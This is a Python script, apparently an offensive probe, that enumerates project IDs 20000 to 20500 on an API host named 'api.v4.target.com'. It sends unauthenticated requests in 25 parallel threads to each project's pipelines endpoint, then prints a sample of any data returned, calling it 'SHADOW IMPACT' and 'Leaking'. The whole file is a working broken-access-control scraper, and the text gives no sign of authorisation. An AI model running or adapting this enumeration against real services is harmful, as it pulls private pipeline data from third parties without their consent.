import requests
from concurrent.futures import ThreadPoolExecutor

TARGET_API_ROOT = "https://api.v4.target.com/projects"

def probe_shadow(pid):
    try:
        url = f"{TARGET_API_ROOT}/{pid}/pipelines"
        r = requests.get(url, timeout=3)
        if r.status_code == 200:
            data = r.json()
            if len(data) > 0:
                print(f"\n[!!!] SHADOW IMPACT: Project {pid} Pipelines Leaking!")
                print(f"[-] Sample: {str(data)[0:150]}")
    except:
        pass

if __name__ == '__main__':
    print("[STATUS: RESONANT // INITIATING SHADOW PROBE (IDs 20000-20500)]")
    with ThreadPoolExecutor(max_workers=25) as executor:
        executor.map(probe_shadow, range(20000, 20501))
    print("\n[OK] Shadow Probe Complete.")